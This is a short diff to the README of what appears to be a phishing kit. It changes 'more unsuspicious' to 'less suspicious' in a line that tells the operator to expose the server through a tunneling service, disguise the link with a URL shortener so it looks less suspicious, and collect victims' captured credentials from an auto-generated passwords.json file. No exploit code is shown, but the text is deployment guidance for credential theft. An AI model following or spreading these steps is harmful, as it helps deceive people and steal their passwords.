@@ -11,6 +11,6 @@ Start the server
 npm start
 ```
 
-After that, you can use any http tunneling service (e.g. `ngrock`) to get a public url; And you can also use any url shortener to make it more unsuspicious. 
+After that, you can use any http tunneling service (e.g. `ngrock`) to get a public url; And you can also use any url shortener to make it less suspicious. 
 
 You will get captured credentials on `passwords.json` file which would be auto-generated.
